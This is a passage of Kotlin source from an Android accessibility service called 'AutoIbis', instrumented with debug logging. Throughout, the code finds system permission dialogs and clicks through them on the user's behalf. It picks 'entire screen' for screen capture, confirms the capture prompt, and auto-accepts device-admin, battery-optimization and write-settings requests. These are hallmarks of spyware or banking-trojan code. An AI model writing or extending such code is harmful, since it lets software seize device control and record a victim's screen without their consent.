                    nodes?.forEach { try { it.recycle() } catch (_: Exception) {} }
                    return found
                }
                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                return check("android:id/button1") ||
                       check("com.android.systemui:id/screen_share_mode_spinner") ||
                       check("com.android.systemui:id/screen_share_permission_dialog") ||
                       check("com.android.systemui:id/screen_share_mode_options")
            }

            try {
                svc.windows?.forEach { w ->
                    try {
                        val r = w.root ?: return@forEach
                        if (r.packageName?.toString() != "com.android.systemui") {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            try { r.recycle() } catch (_: Exception) {}
                            return@forEach
                        }
                        if (hasConfirmDialogContent(r)) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            try { root?.recycle() } catch (_: Exception) {}
                            root = r
                        } else {
                            try { r.recycle() } catch (_: Exception) {}
                        }
                    } catch (_: Exception) {}
                }
            } catch (_: Exception) {}

            if (root == null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                try { activeRoot?.recycle() } catch (_: Exception) {}
                return
            }
            try { activeRoot?.recycle() } catch (_: Exception) {}
        } catch (_: Exception) { return }

        try {
            val isAppSelector = try {
                root!!.findAccessibilityNodeInfosByViewId(
                    "com.android.systemui:id/media_projection_recent_tasks_recycler"
                )?.isNotEmpty() == true
            } catch (_: Exception) { false }
            if (isAppSelector) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                return
            }

            @Suppress("NAME_SHADOWING") val root = root!!

            if (!permDialogTreeDumped) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                permDialogTreeDumped = true
                val sb = StringBuilder("MediaProj PermDialog TREE (pkg=${root.packageName}):\n")
                fun dump(n: AccessibilityNodeInfo, indent: String, depth: Int) {
                    android.util.Log.d("XDBG", "[AutoIbis] dump enter n=${n} indent=${indent} depth=${depth}") //xdbg
                    val b = Rect().also { n.getBoundsInScreen(it) }
                    val line = "$indent cls=${n.className?.toString()?.substringAfterLast('.')} " +
                        "id=${n.viewIdResourceName} txt='${n.text}' cd='${n.contentDescription}' " +
                        "click=${n.isClickable} chk=${n.isChecked} ena=${n.isEnabled} " +
                        "bounds=[${b.left},${b.top},${b.right},${b.bottom}] h=${b.height()}\n"
                    sb.append(line)
                    if (depth < 12) for (i in 0 until n.childCount) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val c = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                        dump(c, "$indent  ", depth + 1)
                        try { c.recycle() } catch (_: Exception) {}
                    }
                }
                dump(root, "", 0)
                try {
                    val dir = svc.getExternalFilesDir(null) ?: svc.cacheDir
                    val f = java.io.File(dir, "autoibis_mp_perm_tree.txt")
                    f.writeText(sb.toString())
                } catch (_: Exception) { }
            }

            val spinnerId = when {
                root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/screen_share_mode_spinner")
                    ?.also { it.forEach { n -> try { n.recycle() } catch (_: Exception) {} } }
                    ?.isNotEmpty() == true -> "com.android.systemui:id/screen_share_mode_spinner"
                root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/screen_share_mode_options")
                    ?.also { it.forEach { n -> try { n.recycle() } catch (_: Exception) {} } }
                    ?.isNotEmpty() == true -> "com.android.systemui:id/screen_share_mode_options"
                else -> null
            }

            if (spinnerId != null && !mediaProjectionSpinnerDone) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                var spinnerClicked = false
                try {
                    root.findAccessibilityNodeInfosByViewId(spinnerId)?.let { nodes ->
                        val spinnerNode = nodes.firstOrNull()
                        if (spinnerNode != null) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            spinnerClicked = spinnerNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        }
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                    }
                } catch (_: Exception) {}
                mediaProjectionSpinnerDone = true
                handler.postDelayed({
                    if (!mediaProjectionViperActive) return@postDelayed
                    val svc2 = service ?: return@postDelayed
                    var dropdownClicked = false
                    try {
                        val dm = svc2.resources.displayMetrics
                        val screenH = dm.heightPixels
                        val screenW = dm.widthPixels
                        svc2.windows?.forEach wloop@{ w ->
                            if (dropdownClicked) return@wloop
                            val wr = try { w.root } catch (_: Exception) { return@wloop } ?: return@wloop
                            try {
                                val pkg = wr.packageName?.toString() ?: return@wloop
                                if (pkg != "com.android.systemui" && pkg != "android") return@wloop
                                val hasSpinner = wr.findAccessibilityNodeInfosByViewId(spinnerId)
                                    ?.also { it.forEach { n -> try { n.recycle() } catch (_: Exception) {} } }
                                    ?.isNotEmpty() == true
                                val hasBtn1 = wr.findAccessibilityNodeInfosByViewId("android:id/button1")
                                    ?.also { it.forEach { n -> try { n.recycle() } catch (_: Exception) {} } }
                                    ?.isNotEmpty() == true
                                if (hasSpinner || hasBtn1) return@wloop
                                val wrBounds = android.graphics.Rect()
                                wr.getBoundsInScreen(wrBounds)
                                val wrH = wrBounds.height()
                                val wrTop = wrBounds.top
                                val wrBottom = wrBounds.bottom
                                val statusBarMaxH = (screenH * 0.08).toInt()
                                val navBarMinTop = (screenH * 0.92).toInt()
                                if (wrH < statusBarMaxH && wrTop < statusBarMaxH) return@wloop
                                if (wrTop > navBarMinTop) return@wloop
                                if (wrH < 10) return@wloop
                                val items = mutableListOf<AccessibilityNodeInfo>()
                                fun collectClickable(node: AccessibilityNodeInfo, depth: Int) {
                                    android.util.Log.d("XDBG", "[AutoIbis] collectClickable enter node=${node} depth=${depth}") //xdbg
                                    if (depth > 10) return
                                    if (node.isClickable && node.isEnabled) {
                                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                        items.add(node)
                                        return
                                    }
                                    for (i in 0 until node.childCount) {
                                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                                        val c = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                                        collectClickable(c, depth + 1)
                                    }
                                }
                                collectClickable(wr, 0)
                                if (items.size in 1..4) {
                                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                    items.last().performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    dropdownClicked = true
                                }
                                items.forEach { try { it.recycle() } catch (_: Exception) {} }
                            } finally {
                                try { wr.recycle() } catch (_: Exception) {}
                            }
                        }
                    } catch (_: Exception) {}
                    if (dropdownClicked) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 400L)
                    } else {
                        handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 200L)
                    }
                }, 350L)
                return
            }
            val entireId = "com.android.systemui:id/screen_share_mode_entire_screen"
            val entireNodes = try { root.findAccessibilityNodeInfosByViewId(entireId) } catch (_: Exception) { null }
            if (!entireNodes.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (entireNodes.first().isChecked == false) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try { root.findAccessibilityNodeInfosByViewId(entireId)
                        ?.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) {}
                    entireNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                    mediaProjectionRetryCount = 0
                    handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 350L)
                    return
                }
                entireNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
            }

            val btns = try { root.findAccessibilityNodeInfosByViewId("android:id/button1") } catch (_: Exception) { null }
            if (!btns.isNullOrEmpty() && btns.first().isEnabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                btns.first().performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mediaProjectionViperActive = false
                mediaProjectionSpinnerDone = false
                mediaProjectionRetryCount = 0
                btns.forEach { try { it.recycle() } catch (_: Exception) {} }
                return
            }
            if (!btns.isNullOrEmpty() && !btns.first().isEnabled) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                btns.forEach { try { it.recycle() } catch (_: Exception) {} }
                mediaProjectionRetryCount++
                if (mediaProjectionRetryCount <= 8) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 300L)
                } else {
                    mediaProjectionViperActive = false
                    mediaProjectionSpinnerDone = false
                    mediaProjectionRetryCount = 0
                    try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                }
                return
            }
            btns?.forEach { try { it.recycle() } catch (_: Exception) {} }

            mediaProjectionRetryCount++
            if (mediaProjectionRetryCount <= 4) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (inferAndClickPositive(root, svc)) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    mediaProjectionViperActive = false
                    mediaProjectionSpinnerDone = false
                    mediaProjectionRetryCount = 0
                } else {
                    handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 500L)
                }
            } else {
                mediaProjectionViperActive = false
                mediaProjectionSpinnerDone = false
                mediaProjectionRetryCount = 0
                try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
            }

        } finally { try { root?.recycle() } catch (_: Exception) {} }
    }

    private val ENTIRE_SCREEN_IDS = listOf(
        "com.android.systemui:id/screen_share_mode_entire_screen",
        "com.android.systemui:id/entire_screen_section",
        "com.android.systemui:id/entire_screen",
        "com.android.systemui:id/screen_share_entire_screen",
        "com.android.systemui:id/media_projection_entire_screen",
        "com.android.systemui:id/entire_screen_chip"
    )

    private fun findEntireScreenByIds(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findEntireScreenByIds enter root=${root}") //xdbg
        for (id in ENTIRE_SCREEN_IDS) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val n = nodes.first()
                nodes.drop(1).forEach { try { it.recycle() } catch (_: Exception) {} }
                var target: AccessibilityNodeInfo? = if (n.isClickable) n else null
                var cur = try { n.parent } catch (_: Exception) { null }
                repeat(5) {
                    if (cur?.isClickable == true) { target = cur }
                    cur = try { cur?.parent } catch (_: Exception) { null }
                }
                if (target != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                    return target
                }
                try { n.recycle() } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun findFirstRecyclerItem(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findFirstRecyclerItem enter root=${root}") //xdbg
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val n = queue.removeFirst()
            val cls = n.className?.toString() ?: ""
            if ((cls.endsWith("RecyclerView") || cls.endsWith("ListView") || cls.endsWith("GridView"))
                && n.childCount > 0) {
                for (i in 0 until n.childCount) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    val child = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                    if (child.isClickable && child.isEnabled) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                        return child
                    }
                    val inner = findFirstClickableInside(child)
                    if (inner != null) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        try { child.recycle() } catch (_: Exception) {}
                        return inner
                    }
                    try { child.recycle() } catch (_: Exception) {}
                }
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                try { n.getChild(i)?.let { queue.add(it) } } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun findFirstLargeRecyclerItem(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findFirstLargeRecyclerItem enter root=${root}") //xdbg
        val density = try {
            service?.resources?.displayMetrics?.density ?: 3f
        } catch (_: Exception) { 3f }
        val minHeightPx = (80 * density).toInt()

        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val n = queue.removeFirst()
            val cls = n.className?.toString() ?: ""
            if ((cls.endsWith("RecyclerView") || cls.endsWith("ListView") || cls.endsWith("GridView"))
                && n.childCount > 0) {
                for (i in 0 until n.childCount) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    val child = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                    val bounds = Rect().also { child.getBoundsInScreen(it) }
                    if (bounds.height() < minHeightPx) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        try { child.recycle() } catch (_: Exception) {}
                        continue
                    }
                    if (child.isClickable && child.isEnabled) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                        return child
                    }
                    val inner = findFirstClickableInside(child)
                    if (inner != null) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        try { child.recycle() } catch (_: Exception) {}
                        return inner
                    }
                    try { child.recycle() } catch (_: Exception) {}
                }
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                try { n.getChild(i)?.let { queue.add(it) } } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun findFirstClickableInside(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findFirstClickableInside enter node=${node}") //xdbg
        if (node.isClickable && node.isEnabled) return node
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val result = findFirstClickableInside(child)
            if (result != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (result !== child) try { child.recycle() } catch (_: Exception) {}
                return result
            }
            try { child.recycle() } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun getSystemuiRoots(svc: AccessibilityService): List<AccessibilityNodeInfo> {
        android.util.Log.d("XDBG", "[AutoIbis] getSystemuiRoots enter svc=${svc}") //xdbg
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try { svc.rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        try {
            svc.windows?.forEach { w ->
                try { w.root?.let { r ->
                    if (r.packageName?.toString() == "com.android.systemui"
                        && roots.none { it == r }) roots.add(r)
                    else try { r.recycle() } catch (_: Exception) {}
                } } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return roots
    }

    private fun tryHandleAppSelectorDialog(attempt: Int = 0) {
        android.util.Log.d("XDBG", "[AutoIbis] tryHandleAppSelectorDialog enter attempt=${attempt}") //xdbg
        if (!mediaProjectionViperActive) return
        if (attempt >= 5) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val hasRecycler = try {
                service?.rootInActiveWindow?.findAccessibilityNodeInfosByViewId(
                    "com.android.systemui:id/media_projection_recent_tasks_recycler"
                )?.isNotEmpty() == true
            } catch (_: Exception) { false }
            if (!hasRecycler) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                return
            }
            mediaProjectionViperActive = false
            try { service?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
            return
        }
        val svc = service ?: return
        val roots = getSystemuiRoots(svc)

        if (attempt == 0) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val fileSb = StringBuilder()
            for (root in roots) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val sb = StringBuilder("MediaProj AppSelector TREE (pkg=${root.packageName}):\n")
                fun dump(n: AccessibilityNodeInfo, indent: String, depth: Int) {
                    android.util.Log.d("XDBG", "[AutoIbis] dump enter n=${n} indent=${indent} depth=${depth}") //xdbg
                    val b = Rect().also { n.getBoundsInScreen(it) }
                    val line = "$indent cls=${n.className?.toString()?.substringAfterLast('.')} " +
                        "id=${n.viewIdResourceName} txt='${n.text}' cd='${n.contentDescription}' " +
                        "click=${n.isClickable} ena=${n.isEnabled} " +
                        "bounds=[${b.left},${b.top},${b.right},${b.bottom}] h=${b.height()}\n"
                    sb.append(line)
                    if (depth < 12) for (i in 0 until n.childCount) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        val c = try { n.getChild(i) } catch (_: Exception) { null } ?: continue
                        dump(c, "$indent  ", depth + 1)
                        try { c.recycle() } catch (_: Exception) {}
                    }
                }
                dump(root, "", 0)
                fileSb.append(sb)
            }
            try {
                val svcCtx = service
                val dir = svcCtx?.getExternalFilesDir(null) ?: svcCtx?.cacheDir
                if (dir != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val f = java.io.File(dir, "autoibis_mp_tree.txt")
                    f.writeText(fileSb.toString())
                }
            } catch (_: Exception) { }
        }

        var clicked = false
        for (root in roots) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val byId = findEntireScreenByIds(root)
            if (byId != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                byId.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mediaProjectionViperActive = false
                mediaProjectionSpinnerDone = false
                clicked = true
                break
            }
        }
        if (!clicked && attempt <= 2) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val RECENT_RECYCLER_ID = "com.android.systemui:id/media_projection_recent_tasks_recycler"
            for (root in roots) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val recyclers = try { root.findAccessibilityNodeInfosByViewId(RECENT_RECYCLER_ID) }
                                catch (_: Exception) { null }
                if (!recyclers.isNullOrEmpty()) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    val recycler = recyclers.first()
                    recyclers.drop(1).forEach { try { it.recycle() } catch (_: Exception) {} }
                    repeat(5) { recycler.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD) }
                    try { recycler.recycle() } catch (_: Exception) {}
                    roots.forEach { try { it.recycle() } catch (_: Exception) {} }
                    handler.postDelayed({ tryHandleAppSelectorDialog(attempt + 1) }, 400L)
                    return
                }
            }
        }

        if (!clicked && attempt >= 3 && !mediaProjectionSpinnerDone) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            val RESOLVER_ID = "android:id/resolver_list"
            outer@ for (root in roots) {
                val resolvers = try { root.findAccessibilityNodeInfosByViewId(RESOLVER_ID) }
                                catch (_: Exception) { null }
                if (!resolvers.isNullOrEmpty()) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    for (rv in resolvers) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        if (rv.childCount == 0) { try { rv.recycle() } catch (_: Exception) {}; continue }
                        for (i in 0 until rv.childCount) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val child = try { rv.getChild(i) } catch (_: Exception) { null } ?: continue
                            if (child.isClickable && child.isEnabled) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val target = if (child.isClickable) child else findFirstClickableInside(child) ?: child
                                target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                clicked = true
                                listOf(50L, 120L, 250L, 450L, 700L, 1000L).forEach { d ->
                                    handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, d)
                                }
                                try { child.recycle() } catch (_: Exception) {}
                                try { rv.recycle() } catch (_: Exception) {}
                                resolvers.drop(1).forEach { try { it.recycle() } catch (_: Exception) {} }
                                break@outer
                            }
                            try { child.recycle() } catch (_: Exception) {}
                        }
                        try { rv.recycle() } catch (_: Exception) {}
                    }
                    if (!clicked) resolvers.forEach { try { it.recycle() } catch (_: Exception) {} }
                }
            }
        }

        roots.forEach { try { it.recycle() } catch (_: Exception) {} }

        if (!clicked && attempt < 8) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            handler.postDelayed({ tryHandleAppSelectorDialog(attempt + 1) }, 500L)
        }
    }

    private val ENTIRE_SCREEN_CD_PATTERNS = listOf(
        "весь экран", "весь дисплей", "entire screen", "entire display",
        "full screen", "полный экран", "bildschirm", "pantalla completa"
    )

    private fun findEntireScreenByContentDesc(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findEntireScreenByContentDesc enter root=${root}") //xdbg
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val n = queue.removeFirst()
            val cd = n.contentDescription?.toString()?.lowercase() ?: ""
            val txt = n.text?.toString()?.lowercase() ?: ""
            if (ENTIRE_SCREEN_CD_PATTERNS.any { cd.contains(it) || txt.contains(it) }) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                if (n.isClickable) return n
                var cur: AccessibilityNodeInfo? = try { n.parent } catch (_: Exception) { null }
                repeat(5) {
                    if (cur?.isClickable == true) return cur
                    cur = try { cur?.parent } catch (_: Exception) { null }
                }
                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                return n
            }
            for (i in 0 until n.childCount) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                try { n.getChild(i)?.let { queue.add(it) } } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private val ENTIRE_SCREEN_TEXTS = listOf(
        "Весь экран", "весь экран",
        "Entire screen", "entire screen",
        "Полный экран", "полный экран",
        "Весь дисплей", "весь дисплей",
        "Full screen", "full screen",
        "Tüm ekran", "Tam ekran",
        "Ganzer Bildschirm",
        "Tout l'écran",
        "Pantalla completa",
        "Schermo intero"
    )

    private fun findEntireScreenByText(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[AutoIbis] findEntireScreenByText enter root=${root}") //xdbg
        for (text in ENTIRE_SCREEN_TEXTS) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                val n = nodes.first()
                nodes.drop(1).forEach { try { it.recycle() } catch (_: Exception) {} }
                if (n.isClickable) return n
                var cur: AccessibilityNodeInfo? = try { n.parent } catch (_: Exception) { null }
                var target: AccessibilityNodeInfo? = null
                repeat(6) {
                    if (cur?.isClickable == true) { target = cur; return@repeat }
                    cur = try { cur?.parent } catch (_: Exception) { null }
                }
                if (target != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    try { n.recycle() } catch (_: Exception) {}
                    return target
                }
                android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
                return n
            }
        }
        android.util.Log.d("XDBG", "[AutoIbis] return") //xdbg
        return null
    }

    private fun trySelectEntireScreenFromDropdown(attempt: Int) {
        android.util.Log.d("XDBG", "[AutoIbis] trySelectEntireScreenFromDropdown enter attempt=${attempt}") //xdbg
        if (!mediaProjectionViperActive) return
        if (attempt >= 6) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            mediaProjectionViperActive = false
            mediaProjectionSpinnerDone = false
            return
        }
        val svc = service ?: return

        val roots = mutableListOf<AccessibilityNodeInfo>()
        try { svc.rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        try {
            svc.windows?.forEach { w ->
                try { w.root?.let { r -> if (roots.none { it == r }) roots.add(r) } } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        var found = false

        for (root in roots) {
            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
            val byId = findEntireScreenByIds(root)
            if (byId != null) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                byId.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                found = true
                break
            }
        }

        if (!found) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            for (root in roots) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val byText = findEntireScreenByText(root)
                if (byText != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    byText.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    found = true
                    break
                }
            }
        }

        if (!found) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            for (root in roots) {
                android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                val bycd = findEntireScreenByContentDesc(root)
                if (bycd != null) {
                    android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                    bycd.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    found = true
                    break
                }
            }
        }

        if (!found) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            outer@ for (root in roots) {
                val queue = ArrayDeque<AccessibilityNodeInfo>()
                queue.add(root)
                while (queue.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                    val n = queue.removeFirst()
                    val cls = n.className?.toString() ?: ""
                    if (n.childCount >= 1 && (cls.endsWith("ListView") || cls.endsWith("DropDownListView"))) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        for (ci in 0 until n.childCount) {
                            android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                            val child = try { n.getChild(ci) } catch (_: Exception) { null } ?: continue
                            val idName = try { child.viewIdResourceName ?: "" } catch (_: Exception) { "" }
                            val childTxt = (child.text?.toString() ?: "").lowercase()
                            val childCd  = (child.contentDescription?.toString() ?: "").lowercase()
                            val matchesId   = ENTIRE_SCREEN_IDS.any { idName.contains(it.substringAfter(":id/")) }
                            val matchesTxt  = ENTIRE_SCREEN_TEXTS.any { childTxt.contains(it.lowercase()) }
                            val matchesCd   = ENTIRE_SCREEN_CD_PATTERNS.any { childTxt.contains(it) || childCd.contains(it) }
                            val matchesSub  = findEntireScreenByText(child) != null
                            if (matchesId || matchesTxt || matchesCd || matchesSub) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val target = if (child.isClickable) child else findFirstClickableInside(child) ?: child
                                target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                found = true; break@outer
                            }
                            try { child.recycle() } catch (_: Exception) {}
                        }
                        if (!found) {
                            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                            val tryIdx = if (attempt % 2 == 0) 1 else 0
                            val item = try { n.getChild(tryIdx.coerceAtMost(n.childCount - 1)) } catch (_: Exception) { null }
                            if (item != null) {
                                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                                val target = if (item.isClickable) item else findFirstClickableInside(item) ?: item
                                target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                found = true; break@outer
                            }
                        }
                    }
                    for (i in 0 until n.childCount) {
                        android.util.Log.d("XDBG", "[AutoIbis] loop") //xdbg
                        try { n.getChild(i)?.let { queue.add(it) } } catch (_: Exception) {}
                    }
                }
            }
        }
        roots.forEach { try { it.recycle() } catch (_: Exception) {} }

        if (found) {
            android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
            mediaProjectionSpinnerDone = true
            handler.postDelayed({ tryHandleMediaProjectionPermDialog() }, 400L)
        } else {
            handler.postDelayed({ trySelectEntireScreenFromDropdown(attempt + 1) }, 300L)
        }
    }

    fun onDeviceAdminRequested() {
        android.util.Log.d("XDBG", "[AutoIbis] onDeviceAdminRequested enter") //xdbg
        deviceAdminPending = true
        lastSetupMs = System.currentTimeMillis()
        setupDialogActive = true
        setupTreeDumped = false
        adminPostClickRetries = 0
        listOf(500L, 800L, 1200L, 1800L, 2600L, 3600L, 5000L, 8000L, 12000L, 18000L).forEach { d ->
            handler.postDelayed({
                if (setupDialogActive && deviceAdminPending) tryClickSetupDialog()
            }, d)
        }
    }

    fun onBatteryOptimizationRequested() {
        android.util.Log.d("XDBG", "[AutoIbis] onBatteryOptimizationRequested enter") //xdbg
        batteryOptPending = true
        lastSetupMs = System.currentTimeMillis()
        setupDialogActive = true
        listOf(300L, 800L, 1500L, 2500L).forEach { d ->
            handler.postDelayed({
                if (setupDialogActive && batteryOptPending) tryClickSetupDialog()
            }, d)
        }
        handler.postDelayed({
            if (setupDialogActive && batteryOptPending) {
                android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                listOf(0L, 700L, 1400L).forEach { d ->
                    handler.postDelayed({
                        if (setupDialogActive && batteryOptPending) tryClickSetupDialog()
                    }, d)
                }
                handler.postDelayed({
                    if (setupDialogActive && batteryOptPending) {
                        android.util.Log.d("XDBG", "[AutoIbis] if branch") //xdbg
                        onSetupDialogClicked()
                    }
                }, 2500L)
            }
        }, 3000L)
    }

    fun onWriteSettingsRequested() {
        android.util.Log.d("XDBG", "[AutoIbis] onWriteSettingsRequested enter") //xdbg
        writeSettingsPending = true
